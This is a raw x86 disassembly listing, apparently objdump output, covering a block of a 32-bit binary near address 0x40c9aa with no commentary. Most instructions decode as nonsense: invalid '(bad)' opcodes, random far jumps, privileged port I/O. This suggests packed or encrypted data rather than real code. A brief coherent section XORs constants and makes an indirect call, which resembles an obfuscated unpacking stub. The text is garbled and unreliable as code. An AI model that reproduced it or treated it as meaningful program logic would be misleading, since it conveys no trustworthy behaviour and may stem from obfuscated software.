  40c9aa:	aas    
  40c9ab:	test   al,0x35
  40c9ad:	cdq    
  40c9ae:	mov    ?,WORD PTR [eax+0xb]
  40c9b1:	mov    edi,0xbe166875
  40c9b6:	sahf   
  40c9b7:	jmp    0xdc17:0xefcc6d13
  40c9be:	mov    eax,ds:0x8a75f549
  40c9c3:	cmp    DWORD PTR [eax-0x50],ebx
  40c9c6:	jg     0x40ca32
  40c9c8:	(bad)  [ecx]
  40c9ca:	in     eax,dx
  40c9cb:	mov    ax,ds:0xd1f0aad5
  40c9d1:	xchg   esp,eax
  40c9d2:	int3   
  40c9d3:	pusha  
  40c9d4:	or     edi,edx
  40c9d6:	xchg   BYTE PTR [eax],al
  40c9d8:	pop    esi
  40c9d9:	mov    dl,0x73
  40c9db:	gs icebp 
  40c9dd:	jae    0x40c99c
  40c9df:	pushf  
  40c9e0:	jmp    0xdb22:0x799f9ba5
  40c9e7:	les    eax,FWORD PTR [eax+edx*8+0x2c]
  40c9eb:	pop    ebp
  40c9ec:	sub    esp,DWORD PTR [esi]
  40c9ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c9ef:	mov    esp,DWORD PTR [edi+0xe3de88]
  40c9f5:	add    dh,bh
  40c9f7:	repnz aam 0x2a
  40c9fa:	je     0x40c9c2
  40c9fc:	loope  0x40ca16
  40c9fe:	sub    dh,BYTE PTR [ebp+0x40]
  40ca01:	mov    esi,0xd14c9566
  40ca06:	adc    al,0xad
  40ca08:	out    0x52,al
  40ca0a:	push   es
  40ca0b:	in     eax,0x72
  40ca0d:	aad    0x15
  40ca0f:	or     eax,0x855b8b8a
  40ca14:	outs   dx,DWORD PTR ds:[esi]
  40ca15:	cdq    
  40ca16:	ds mov ecx,0xfcc8dff7
  40ca1c:	jmp    0xdfe71dee
  40ca21:	add    BYTE PTR ds:0x9ba88b79,dh
  40ca27:	sar    DWORD PTR [ebx],0x1b
  40ca2a:	bound  ebx,QWORD PTR [edx-0x33a67b93]
  40ca30:	sbb    esp,DWORD PTR [ebp-0x7d]
  40ca33:	or     DWORD PTR [eax+0x5e733cc],ecx
  40ca39:	mov    dh,0x90
  40ca3b:	in     al,0xfb
  40ca3d:	iret   
  40ca3e:	mov    WORD PTR [edx+0x350d3801],ds
  40ca44:	stc    
  40ca45:	mov    eax,ds:0xe680478d
  40ca4a:	icebp  
  40ca4b:	test   BYTE PTR [ecx+ebp*2+0x5d],ch
  40ca4f:	push   esi
  40ca50:	xor    bh,BYTE PTR [eax-0x33]
  40ca53:	push   ecx
  40ca54:	test   eax,0x40b26317
  40ca59:	lahf   
  40ca5a:	sub    DWORD PTR [ecx+0x51],edi
  40ca5d:	inc    ebp
  40ca5e:	inc    edi
  40ca5f:	inc    esp
  40ca60:	ror    ch,1
  40ca62:	fcom   st(5)
  40ca64:	lods   eax,DWORD PTR ds:[esi]
  40ca65:	mov    ebx,0xe1dcfaa1
  40ca6a:	shr    cl,1
  40ca6c:	pusha  
  40ca6d:	hlt    
  40ca6e:	ss shl edx,cl
  40ca71:	add    bl,BYTE PTR [edx]
  40ca73:	sbb    BYTE PTR [esi],bl
  40ca75:	sti    
  40ca76:	in     eax,dx
  40ca77:	pusha  
  40ca78:	pop    ebx
  40ca79:	mov    dh,0xbb
  40ca7b:	inc    ecx
  40ca7c:	pop    esp
  40ca7d:	lock push es
  40ca7f:	inc    esi
  40ca80:	pxor   mm0,QWORD PTR [edi-0x278d540f]
  40ca87:	fxch   st(0)
  40ca89:	xor    al,0x5c
  40ca8b:	sar    BYTE PTR [edx+0x35],1
  40ca8e:	sub    BYTE PTR [esi],ah
  40ca90:	jbe    0x40ca9c
  40ca92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca93:	sti    
  40ca94:	in     al,0xca
  40ca96:	xor    eax,0x59957fb6
  40ca9b:	fistp  WORD PTR [edi+ebx*2-0x1b]
  40ca9f:	retf   
  40caa0:	push   ebx
  40caa1:	repz sub bl,dl
  40caa4:	mov    ebx,DWORD PTR [eax+0x3e]
  40caa7:	inc    eax
  40caa8:	xchg   ecx,eax
  40caa9:	popf   
  40caaa:	loope  0x40ca44
  40caac:	mov    ch,BYTE PTR es:[esi-0x13]
  40cab0:	lods   al,BYTE PTR ds:[esi]
  40cab1:	and    esi,ecx
  40cab3:	xor    al,0x54
  40cab5:	scas   al,BYTE PTR es:[edi]
  40cab6:	xchg   BYTE PTR [edx+0x750b0c7e],al
  40cabc:	inc    esi
  40cabd:	das    
  40cabe:	into   
  40cabf:	sbb    eax,0xd75f58d1
  40cac4:	jp     0x40cb0d
  40cac6:	int    0x4f
  40cac8:	mov    eax,DWORD PTR [edi+0x22e2e44c]
  40cace:	mov    ?,WORD PTR [eax-0x33]
  40cad1:	mov    al,0xe9
  40cad3:	ins    DWORD PTR es:[edi],dx
  40cad4:	fdiv   QWORD PTR [eax+0xb]
  40cad7:	test   DWORD PTR [edi],ebx
  40cad9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cada:	(bad)  
  40cadb:	icebp  
  40cadc:	pop    edx
  40cadd:	dec    esi
  40cade:	push   ss
  40cadf:	mov    edx,0xdf9207e6
  40cae4:	push   0xfffffff0
  40cae6:	dec    ebx
  40cae7:	iret   
  40cae8:	stos   DWORD PTR es:[edi],eax
  40cae9:	rcr    BYTE PTR [edx-0x12],cl
  40caec:	ins    DWORD PTR es:[edi],dx
  40caed:	adc    DWORD PTR [edx+0x12],ebx
  40caf0:	mov    ah,0xf0
  40caf2:	lock add ch,ah
  40caf5:	mov    eax,ds:0x9f37258b
  40cafa:	pop    ecx
  40cafb:	(bad)  [esi+0x385d557f]
  40cb01:	pop    ebx
  40cb02:	cmp    al,BYTE PTR [ecx+0x55]
  40cb05:	jno    0x40caf0
  40cb07:	fwait
  40cb08:	je     0x40cb69
  40cb0a:	loop   0x40cadc
  40cb0c:	sbb    al,bl
  40cb0e:	pop    edi
  40cb0f:	dec    edx
  40cb10:	shr    DWORD PTR [ecx],cl
  40cb12:	adc    BYTE PTR [eax-0x7b],ah
  40cb15:	imul   eax,DWORD PTR [esi],0xce3b29ba
  40cb1b:	jae    0x40cb99
  40cb1d:	mov    ds:0xf24e67f8,al
  40cb22:	in     eax,0xa5
  40cb24:	push   esi
  40cb25:	loope  0x40cae0
  40cb27:	xor    dl,BYTE PTR [esi+0x28]
  40cb2a:	add    eax,0x43a8bffe
  40cb2f:	retf   0x3667
  40cb32:	fdiv   st(7),st
  40cb34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb35:	jmp    0x9cb6c826
  40cb3a:	mov    edx,0x5093605e
  40cb3f:	sub    bh,BYTE PTR [eax+0x265232c3]
  40cb45:	leave  
  40cb46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb48:	xchg   edx,eax
  40cb49:	fs pop edi
  40cb4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb4c:	push   edi
  40cb4d:	jns    0x40cba3
  40cb4f:	stos   BYTE PTR es:[edi],al
  40cb50:	retfw  
  40cb52:	ins    DWORD PTR es:[edi],dx
  40cb53:	mov    al,0xf9
  40cb55:	or     bl,BYTE PTR [ecx]
  40cb57:	aam    0x28
  40cb59:	lock retw 0x21eb
  40cb5e:	sub    ch,al
  40cb60:	xor    eax,0x41dabfd9
  40cb65:	adc    BYTE PTR [ebx+0x49],bh
  40cb68:	jmp    0x40cb49
  40cb6a:	and    ecx,esp
  40cb6c:	add    ch,BYTE PTR [eax+ebp*1]
  40cb6f:	inc    ebx
  40cb70:	icebp  
  40cb71:	mov    bh,0x7a
  40cb73:	dec    ebp
  40cb74:	les    ebp,FWORD PTR cs:[ecx-0x5bf15b91]
  40cb7b:	fcmovne st,st(6)
  40cb7d:	cmp    eax,0xd4f12027
  40cb82:	xor    al,0x9e
  40cb84:	loope  0x40cb31
  40cb86:	mov    edi,0x43f2dc66
  40cb8b:	dec    edi
  40cb8c:	test   edx,ecx
  40cb8e:	ss jmp 0x40cbe2
  40cb91:	inc    ebx
  40cb92:	mov    eax,0x3541062
  40cb97:	(bad)  
  40cb98:	imul   eax,DWORD PTR [edx]
  40cb9b:	mov    edx,DWORD PTR [ebp-0x4]
  40cb9e:	xor    edx,ecx
  40cba0:	mov    ecx,DWORD PTR [ebp+0x8]
  40cba3:	lea    ecx,[edx+ecx*1+0x32729b]
  40cbaa:	cmp    ecx,eax
  40cbac:	jne    0x40c41f
  40cbb2:	mov    ebx,esi
  40cbb4:	jmp    0x40cbbe
  40cbb9:	mov    ebx,0x32729b
  40cbbe:	mov    eax,DWORD PTR [ebp-0x4]
  40cbc1:	xor    eax,0x7510854
  40cbc6:	add    eax,ebx
  40cbc8:	mov    DWORD PTR [ebp-0xc],eax
  40cbcb:	xor    ebx,ebx
  40cbcd:	lea    eax,[ebp-0x10]
  40cbd0:	add    ebx,DWORD PTR [eax]
  40cbd2:	call   ebx
  40cbd4:	xor    ebx,ebx
  40cbd6:	inc    ebx
  40cbd7:	cmp    DWORD PTR [ebp+0x10],ebx
  40cbda:	je     0x40d321
  40cbe0:	xchg   edx,eax
  40cbe1:	push   0xa
  40cbe3:	pop    ecx
  40cbe4:	push   0x4
  40cbe6:	pop    ebx
  40cbe7:	inc    ebx
  40cbe8:	xchg   ebx,ecx
  40cbea:	jmp    0x40ce4d
  40cbef:	imul   edx,DWORD PTR [edi-0x4b0ecbf3],0x73
  40cbf6:	push   ecx
  40cbf7:	int3   
  40cbf8:	xor    esp,DWORD PTR [esi+edi*8+0x44]
  40cbfc:	inc    edi
  40cbfd:	dec    edx
  40cbfe:	push   edx
  40cbff:	bound  ecx,QWORD PTR [esi+edi*2+0x7e7c387e]
  40cc06:	jle    0x40cc3c
  40cc08:	bswap  ecx
  40cc0a:	jae    0x40cbcd
  40cc0c:	ret    
  40cc0d:	sbb    al,dh
  40cc0f:	adc    al,0x8c
  40cc11:	popf   
  40cc12:	xor    DWORD PTR [eax+0x51ddd76f],edx
  40cc18:	sbb    BYTE PTR [edi+0x3ff4def2],ah
  40cc1e:	jne    0x40cc42
  40cc20:	inc    esi
  40cc21:	mov    ds:0x7f03121c,eax
  40cc26:	mov    ds:0x820ec30b,eax
  40cc2b:	dec    eax
  40cc2c:	push   0xb7f0b013
  40cc31:	dec    edx
  40cc32:	jnp    0x40cc6b
  40cc34:	dec    eax
  40cc35:	push   ds
  40cc36:	(bad)
  40cc3a:	mov    DWORD PTR [ebx+0x4095955d],eax
  40cc40:	and    bl,al
  40cc42:	push   ecx
  40cc43:	arpl   WORD PTR [ebx+0x69],sp
  40cc46:	out    0x24,eax
  40cc48:	ja     0x40ccbf
  40cc4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc4b:	push   0x26fb9cca
  40cc50:	cwde   
  40cc51:	or     esi,ebx
  40cc53:	loop   0x40ccb7
  40cc55:	(bad)  
  40cc56:	nop
  40cc57:	push   ecx
  40cc58:	jmp    0x40ccd8
  40cc5a:	cs loope 0x40cc5e
  40cc5d:	jo     0x40cc13
  40cc5f:	(bad)  
  40cc60:	pop    esi
  40cc61:	retf   0xaf7e
  40cc64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc65:	ss mov ebp,0xba9fcca5
  40cc6b:	jb     0x40ccb6
  40cc6d:	pop    ds
  40cc6e:	repnz and al,0x8f
  40cc71:	sub    al,0x19
  40cc73:	cdq    
  40cc74:	or     BYTE PTR [edx-0x11b4dde],dl
  40cc7a:	push   ecx
  40cc7b:	cmp    ebp,DWORD PTR [edx]
  40cc7d:	push   ebp
  40cc7e:	xor    al,0xeb
  40cc80:	push   edx
  40cc81:	nop
  40cc82:	mov    ebx,0xd132b0ea
  40cc87:	les    esi,FWORD PTR gs:[eax+0x1468694]
  40cc8e:	cmp    BYTE PTR [esi],dl
  40cc90:	fld    QWORD PTR [ecx]
  40cc92:	mov    ebp,0x9f429693
  40cc97:	out    0xed,eax
  40cc99:	add    al,0xa4
  40cc9b:	mov    dh,0x41
  40cc9d:	xlat   BYTE PTR ds:[ebx]
  40cc9e:	outs   dx,BYTE PTR ds:[esi]
  40cc9f:	pop    ebp
  40cca0:	mov    WORD PTR [ecx+0x7554730e],?
  40cca6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cca7:	lea    ebx,[eax]
  40cca9:	push   edx
  40ccaa:	inc    esi
  40ccab:	mov    dh,0x8c
  40ccad:	adc    bh,BYTE PTR [esi]
  40ccaf:	xchg   ecx,eax
  40ccb0:	fiadd  DWORD PTR [ecx]
  40ccb2:	or     BYTE PTR [esi-0x51b13f3f],0x9c
  40ccb9:	push   esp
  40ccba:	fsubr  DWORD PTR [ebx-0x6ae42f44]
  40ccc0:	ret    
  40ccc1:	jmp    0x1e69:0x22e67cd3
  40ccc8:	jns    0x40ccde
  40ccca:	sbb    eax,esp
  40cccc:	cs jno 0x40cc8c
  40cccf:	inc    esp
  40ccd0:	jno    0x40ccb1
  40ccd2:	scas   al,BYTE PTR es:[edi]
  40ccd3:	loope  0x40ccdb
  40ccd5:	fwait
  40ccd6:	inc    esi
  40ccd7:	or     edx,DWORD PTR ds:0xa5b57ba9
  40ccdd:	mov    bl,0xa8
  40ccdf:	ins    DWORD PTR es:[edi],dx
  40cce0:	(bad)  
  40cce1:	enter  0x1fbe,0xef
  40cce5:	repnz mov ss,WORD PTR [esi-0x4b220adf]
  40ccec:	cmp    BYTE PTR [ecx-0x17],al
  40ccef:	sub    al,0x25
  40ccf1:	std    
  40ccf2:	retf   0xabc1
  40ccf5:	jp     0x40cc83
  40ccf7:	fiadd  WORD PTR [eax]
  40ccf9:	cs pushf 
  40ccfb:	ss push eax
  40ccfd:	adc    BYTE PTR [edx],0xb7
  40cd00:	loopne 0x40ccc7
  40cd02:	or     DWORD PTR [eax],0xe5e39d7
  40cd08:	in     al,dx
  40cd09:	out    0xa,eax
  40cd0b:	lea    ebp,[ecx+0x75]
  40cd0e:	in     al,dx
  40cd0f:	pop    ss
  40cd10:	inc    esi
  40cd11:	lea    edi,[eax-0x2495e03a]
  40cd17:	adc    bl,BYTE PTR [edi-0x6d]
  40cd1a:	aad    0xa1
  40cd1c:	add    eax,eax
  40cd1e:	div    BYTE PTR ds:0x3174db48
  40cd24:	sub    BYTE PTR [edx-0x5be86289],bh
  40cd2a:	mov    DWORD PTR [ecx-0x640e22ad],edx
  40cd30:	das    
  40cd31:	or     BYTE PTR ds:0xfcc0be26,0xad
  40cd38:	fisubr WORD PTR [edi-0xfaa6f75]
  40cd3e:	inc    eax
  40cd3f:	pop    ds
  40cd40:	leave  
  40cd41:	push   edi
  40cd42:	retf   0x9e0c
  40cd45:	sbb    bl,BYTE PTR [edi+0x4670305f]
  40cd4b:	mov    DWORD PTR [edi-0x6e405793],esp
  40cd51:	outs   dx,DWORD PTR ds:[esi]
  40cd52:	pop    es
  40cd53:	or     bh,BYTE PTR [ebx+0x28377b3d]
  40cd59:	cmp    DWORD PTR [edx],0xffffffd1
  40cd5c:	mov    edi,0x6b5c18bb
  40cd61:	xchg   esi,eax
  40cd62:	(bad)  
  40cd63:	push   0x9f30bbb1
  40cd68:	add    DWORD PTR [eax-0x4],ecx
  40cd6b:	cwde   
  40cd6c:	ror    DWORD PTR [edx+0x25],0xca
  40cd70:	mov    edx,0xd9cccdd5
  40cd75:	dec    edx
  40cd76:	ror    BYTE PTR [edi-0x19],1
  40cd79:	mov    bl,0xa9
  40cd7b:	(bad)  
  40cd7c:	or     ebx,DWORD PTR [edi+0xdc61f6c]
  40cd82:	pop    ss
  40cd83:	retf   
  40cd84:	mov    al,ds:0x66294846
  40cd89:	adc    BYTE PTR [ebp+0x9],bl
  40cd8c:	adc    ebx,DWORD PTR [eax]
  40cd8e:	outs   dx,BYTE PTR ds:[esi]
  40cd8f:	push   edi
  40cd90:	in     al,0xfd
  40cd92:	inc    ecx
  40cd93:	mov    WORD PTR [esi-0x5e],ss
  40cd96:	cdq    
  40cd97:	hlt    
  40cd98:	out    0xac,al
  40cd9a:	and    al,0x14
  40cd9c:	or     DWORD PTR [edx],ecx
  40cd9e:	shr    BYTE PTR [ebp+0x1b],1
  40cda1:	retf   0x6c48
  40cda4:	or     esp,esi
  40cda6:	jge    0x40cd72
  40cda8:	cmp    eax,0xfb282b9a
  40cdad:	scas   eax,DWORD PTR es:[edi]
  40cdae:	hlt    
  40cdaf:	lds    ecx,FWORD PTR [edx+0x1395a210]
  40cdb5:	and    BYTE PTR [ecx+eiz*1+0x257e490f],0x67
  40cdbd:	(bad)  
  40cdbe:	pusha  
  40cdbf:	repnz int 0x67
  40cdc2:	pushf  
  40cdc3:	arpl   WORD PTR [ebp+edi*1-0x6f],cx
  40cdc7:	test   al,0x61
  40cdc9:	jmp    0x6924:0x1195c94a
  40cdd0:	or     bl,BYTE PTR [edi+ecx*4+0x7]
  40cdd4:	imul   ebp,DWORD PTR [ebx-0x79],0x23
  40cdd8:	push   ebp
  40cdd9:	cmc    
  40cdda:	and    al,0xae
  40cddc:	cli    
  40cddd:	lock xchg DWORD PTR [esi],ebp
  40cde0:	test   bh,bh
  40cde2:	add    esi,DWORD PTR [edx]
  40cde4:	pop    ebp
  40cde5:	and    al,0xc
  40cde7:	rol    BYTE PTR ds:0x68abf115,0x6b
  40cdee:	scas   al,BYTE PTR es:[edi]
  40cdef:	outs   dx,DWORD PTR ds:[esi]
  40cdf0:	pop    ebx
  40cdf1:	sbb    al,0xc5
  40cdf3:	lea    eax,[ebx]
  40cdf5:	mov    ch,0x6a
  40cdf7:	mov    ebp,0xa6ca0107
  40cdfc:	fisttp WORD PTR [esi-0x74]
  40cdff:	cmc    
  40ce00:	mov    dh,0xd8
  40ce02:	mov    eax,0xd9851f8f
  40ce07:	push   ebx
  40ce08:	in     eax,0x49
  40ce0a:	and    cl,ch
  40ce0c:	mov    edx,0x3dc2ac4
  40ce11:	cwde   
  40ce12:	cli    
  40ce13:	add    edi,DWORD PTR [ebx+0x24]
  40ce16:	jmp    0x40ce0d
  40ce18:	lahf   
  40ce19:	leave  
  40ce1a:	xor    BYTE PTR [eax+eiz*8],cl
  40ce1d:	xchg   edx,eax
  40ce1e:	sar    BYTE PTR [eax-0x582c15e2],1
  40ce24:	rcr    bl,1
  40ce26:	lea    ebp,[eax+0x3dcf6f61]
  40ce2c:	cmp    eax,DWORD PTR [edx+0x6993bd2c]
  40ce32:	inc    eax
  40ce33:	iret   
  40ce34:	jbe    0x40ce82
  40ce36:	shl    BYTE PTR [eax-0x4a0168b7],cl
  40ce3c:	loop   0x40cdc1
  40ce3e:	out    dx,eax
  40ce3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce40:	bound  ecx,QWORD PTR [ecx+eax*8+0x67d4cabd]
  40ce47:	inc    edx
  40ce48:	loope  0x40cdfe
  40ce4a:	cmp    esi,DWORD PTR [esi+ecx*8+0x2b]
  40ce4e:	fld    DWORD PTR [edi+0x25ee9cb]
  40ce54:	add    BYTE PTR [eax],al
  40ce56:	push   ebx
  40ce57:	std    
  40ce58:	dec    ebx
  40ce59:	sahf   
  40ce5a:	push   ecx
  40ce5b:	push   0x84027173
  40ce60:	add    al,0xed
  40ce62:	pop    ds
  40ce63:	adc    cl,BYTE PTR [edx]
  40ce65:	loope  0x40ce93
  40ce67:	mov    edi,DWORD PTR [esi+0x7e]
  40ce6a:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40ce6e:	dec    esi
  40ce6f:	push   cs
  40ce70:	stos   DWORD PTR es:[edi],eax
  40ce71:	jae    0x40ce68
  40ce73:	shl    dh,0xa
  40ce76:	push   ebx
  40ce77:	jb     0x40ce50
  40ce79:	inc    ebp
  40ce7a:	dec    esi
  40ce7b:	rcl    BYTE PTR [esi-0x702edb56],0x2d
  40ce82:	mov    ebx,0x438d7ec8
  40ce87:	int    0x8a
  40ce89:	jbe    0x40cef5
  40ce8b:	fcmovu st,st(3)
  40ce8d:	inc    ecx
  40ce8e:	or     DWORD PTR [ebx+0x24],ecx
  40ce91:	or     cl,dh
  40ce93:	sbb    bh,dh
  40ce95:	cdq    
  40ce96:	xor    al,0xab
  40ce98:	pusha  
  40ce99:	jo     0x40cf04
  40ce9b:	repz pop ecx
  40ce9d:	mov    eax,ds:0x84556cb7
  40cea2:	xor    bh,BYTE PTR [edi+0xd]
  40cea5:	rcr    edx,cl
  40cea7:	ret    0xa3bb
  40ceaa:	scas   al,BYTE PTR es:[edi]
  40ceab:	mov    BYTE PTR [edx],dh
  40cead:	add    dl,ah
  40ceaf:	arpl   ax,ax
  40ceb1:	rcr    BYTE PTR [ecx-0x37],cl
  40ceb4:	or     al,0x0
  40ceb6:	mov    bh,0x45
  40ceb8:	icebp  
  40ceb9:	ja     0x40ceb5
  40cebb:	cwde   
  40cebc:	lds    ebp,FWORD PTR [ecx]
  40cebe:	pop    es
  40cebf:	or     eax,0x89c27278
  40cec4:	arpl   WORD PTR [edx-0x17a49720],cx
  40ceca:	dec    eax
  40cecb:	mov    WORD PTR [edi+0x23],cs
  40cece:	mov    bh,0x5d
  40ced0:	clc    
  40ced1:	adc    ebx,0x40
  40ced4:	jmp    0x1a00:0xeb64e4ad
  40cedb:	data16 (bad) 
  40cedd:	lods   eax,DWORD PTR ds:[esi]
  40cede:	ss fucom st(1)
  40cee1:	daa    
  40cee2:	add    eax,0x7c310d07
  40cee7:	ficomp DWORD PTR [ebp+0x78]
  40ceea:	lock jle 0x40cee6
  40ceed:	jne    0x40cea3
  40ceef:	sub    dl,BYTE PTR [esi-0x5]
  40cef2:	adc    ch,BYTE PTR [ecx+0x37]
  40cef5:	call   0x553bbf82
  40cefa:	or     DWORD PTR [edx],ebp
  40cefc:	inc    ebp
  40cefd:	loop   0x40ce8d
  40ceff:	and    ebp,DWORD PTR [ebp-0x1d3ab1]
  40cf05:	mov    cl,0xe3
  40cf07:	push   edi
  40cf08:	mov    al,ds:0x9839dcb2
  40cf0d:	lods   al,BYTE PTR ds:[esi]
  40cf0e:	ror    DWORD PTR [edx],cl
  40cf10:	and    DWORD PTR [ebx-0x51],ebp
  40cf13:	push   0x3f
  40cf15:	push   ebx
  40cf16:	call   0x6f48:0xa328f69d
  40cf1d:	test   eax,0x468e0382
  40cf22:	jecxz  0x40ced5
  40cf24:	leave  
  40cf25:	data16 jno 0x40cf99
  40cf28:	pop    edi
  40cf29:	pop    ebp
  40cf2a:	cmp    WORD PTR [esi-0x48],dx
  40cf2e:	ret    
  40cf2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cf30:	ss jp  0x40cf81
  40cf33:	adc    BYTE PTR [ecx-0x4a12990a],0xce
  40cf3a:	xchg   edi,eax
  40cf3b:	push   0xbe0fc9f9
  40cf40:	mov    ecx,0xbb450e41
  40cf45:	sub    edx,ebp
  40cf47:	xchg   ebx,eax
  40cf48:	sub    ah,BYTE PTR [edx]
  40cf4a:	fbld   TBYTE PTR [eax+0x66]
  40cf4d:	sbb    BYTE PTR [ecx+ebx*4],cl
  40cf50:	imul   esp,DWORD PTR [edi-0x78],0x952d3855
  40cf57:	mov    ecx,esp
  40cf59:	xor    BYTE PTR [edx],ah
  40cf5b:	fdivr  QWORD PTR [ebp-0x47]
  40cf5e:	mov    esi,esi
  40cf60:	test   DWORD PTR [edx+0x72],eax
  40cf63:	mov    dh,BYTE PTR [ecx]
  40cf65:	fisubr WORD PTR [eax-0x58]
  40cf68:	adc    BYTE PTR [ebx+0x2],cl
  40cf6b:	fs sub eax,0xa3890a3a
  40cf71:	pop    es
  40cf72:	jbe    0x40cf9c
  40cf74:	dec    ebp
  40cf75:	shl    BYTE PTR [ebp+0x3707a329],0x6
  40cf7c:	adc    DWORD PTR [edi-0x3c116214],ebp
  40cf82:	int    0x8a
  40cf84:	add    eax,0x5f934211
  40cf89:	cmp    ebx,DWORD PTR cs:[ebx+0x2c]
  40cf8d:	and    al,0xc
  40cf8f:	std    
  40cf90:	push   ss
  40cf91:	(bad)  
  40cf92:	jb     0x40d00e
  40cf94:	cmp    eax,0x2579da35
  40cf99:	inc    edi
  40cf9a:	mov    edi,0xe6d71231
  40cf9f:	sub    bh,BYTE PTR ds:0x1e233632
  40cfa5:	cmp    ecx,DWORD PTR [eax+0x2a0cb65f]
  40cfab:	lahf   
  40cfac:	xchg   ebx,eax
  40cfad:	scas   al,BYTE PTR es:[edi]
  40cfae:	mov    esi,0xf3904642
  40cfb3:	jge    0x40cff9
  40cfb5:	xchg   BYTE PTR [ebx-0x2e],dl
  40cfb8:	pop    esi
  40cfb9:	mov    dh,0x59
  40cfbb:	test   al,cl
  40cfbd:	xchg   esi,eax
  40cfbe:	iret   
  40cfbf:	sub    BYTE PTR [ebx+0x38],0xd0
  40cfc3:	dec    ebp
  40cfc4:	xsavec [eax+0x5e414f1f]
  40cfcb:	xchg   ebx,esi
  40cfcd:	fimul  WORD PTR [edi+eax*8+0x1e585667]
  40cfd4:	push   ss
  40cfd5:	and    bl,bl
  40cfd7:	dec    edx
  40cfd8:	xchg   edx,eax
  40cfd9:	rcl    BYTE PTR [ebx+edx*1-0x4e54fa94],1
  40cfe0:	retf   
  40cfe1:	scas   al,BYTE PTR es:[edi]
  40cfe2:	inc    eax
  40cfe3:	push   ecx
  40cfe4:	mov    ss,WORD PTR [ebp-0x1]
  40cfe7:	hlt    
  40cfe8:	sar    DWORD PTR [edx],cl
  40cfea:	xchg   esi,eax
  40cfeb:	push   ds
  40cfec:	pop    esp
  40cfed:	sbb    ah,ah
  40cfef:	lods   al,BYTE PTR ds:[esi]
  40cff0:	mov    ah,0xc0
  40cff2:	sahf   
  40cff3:	sub    DWORD PTR [esi+0x15],ebp
  40cff6:	lods   al,BYTE PTR ds:[esi]
  40cff7:	add    DWORD PTR [edi],0xff9d5b4b
  40cffd:	sbb    al,BYTE PTR [ebx]
  40cfff:	in     eax,dx
  40d000:	sub    DWORD PTR [ecx-0x24],esi
  40d003:	pop    es
  40d004:	and    DWORD PTR [ebp-0x4b],esp
  40d007:	imul   esp,DWORD PTR [ecx],0xcd52c9d6
  40d00d:	mov    al,ds:0xb36017dc
  40d012:	rcl    DWORD PTR [bp+di-0x46],1
  40d016:	shr    BYTE PTR [esi-0x12268474],1
  40d01c:	and    dh,0x6e
  40d01f:	jmp    0xa29:0x7f1d22a6
  40d026:	pop    eax
  40d027:	rol    DWORD PTR [edx],cl
  40d029:	xor    bl,BYTE PTR [ebx-0x57]
  40d02c:	push   ss
  40d02d:	push   edi
  40d02e:	push   ecx
  40d02f:	xchg   ebx,eax
  40d030:	(bad)  
  40d031:	sub    eax,0x13752bb8
  40d036:	add    eax,0x7b28c66f
  40d03b:	push   0x6245a286
  40d040:	sbb    ch,BYTE PTR [edx]
  40d042:	cmp    ch,BYTE PTR [esi]
  40d044:	lahf   
  40d045:	lea    eax,[edi+0x2]
  40d048:	xor    al,0xbe
  40d04a:	sbb    BYTE PTR [eiz*1+0x14a82fff],ah
  40d051:	adc    cl,BYTE PTR [ebp-0x69]
  40d054:	mov    esi,0x302e5694
  40d059:	cld    
  40d05a:	cmp    eax,0xf71ff72e
  40d05f:	sub    eax,0xd06b5f52
  40d064:	inc    edi
  40d065:	jbe    0x40d0ca
  40d067:	or     ah,BYTE PTR [edi+0x34]
  40d06a:	cdq    
  40d06b:	xchg   ebx,eax
  40d06c:	shr    DWORD PTR [ebx-0x57],1
  40d06f:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d071:	add    BYTE PTR [esi+0x71f7fe73],dl
  40d077:	call   0x2d974d54
  40d07c:	push   ecx
  40d07d:	std    
  40d07e:	inc    ebp
  40d07f:	popf   
  40d080:	std    
  40d081:	adc    DWORD PTR [esp+edi*1-0x44],edx
  40d085:	jae    0x40d0bc
  40d087:	repz in eax,0x40
  40d08a:	mov    al,ds:0x6e5bd201
  40d08f:	shr    BYTE PTR [ecx-0x1bca8b8a],cl
  40d095:	bound  ebp,QWORD PTR [ebp+0x1cff97eb]
  40d09b:	nop
  40d09c:	xchg   esi,eax
  40d09d:	mov    ds:0xe510cb87,eax
  40d0a2:	xor    esp,DWORD PTR [eax+0xda11433]
  40d0a8:	push   ecx
  40d0a9:	rcr    DWORD PTR [ebx-0x43],0xa0
  40d0ad:	mov    al,ds:0xfb412a76
  40d0b2:	jmp    0x40d055
  40d0b4:	dec    ecx
  40d0b5:	mov    eax,DWORD PTR [ebp-0x1c]
  40d0b8:	imul   eax,ecx
  40d0bb:	add    esp,eax
  40d0bd:	xchg   edx,eax
  40d0be:	jmp    0x40d321
  40d0c3:	sahf   
  40d0c4:	test   BYTE PTR [edi],0xc3
  40d0c7:	push   edi
  40d0c8:	repz pop edx
  40d0ca:	jae    0x40d0bf
  40d0cc:	ficom  WORD PTR [edx+0x6a]
  40d0cf:	neg    ebx
  40d0d1:	fcomp  DWORD PTR ds:0x7e7e89f6
  40d0d7:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40d0db:	push   ds
  40d0dc:	outs   dx,DWORD PTR ds:[esi]
  40d0dd:	xchg   ecx,eax
  40d0de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d0df:	fsub   DWORD PTR [ecx-0x60dcf3b0]
  40d0e5:	push   ss
  40d0e6:	loopne 0x40d0ab
  40d0e8:	loope  0x40d093
  40d0ea:	(bad)  
  40d0eb:	bound  esp,QWORD PTR [edi]
  40d0ed:	stc    
  40d0ee:	or     DWORD PTR ds:0x4ce7eb55,0x982f063
  40d0f8:	inc    edi
  40d0f9:	inc    ebp
  40d0fa:	int3   
  40d0fb:	rol    dl,cl
  40d0fd:	in     al,0x27
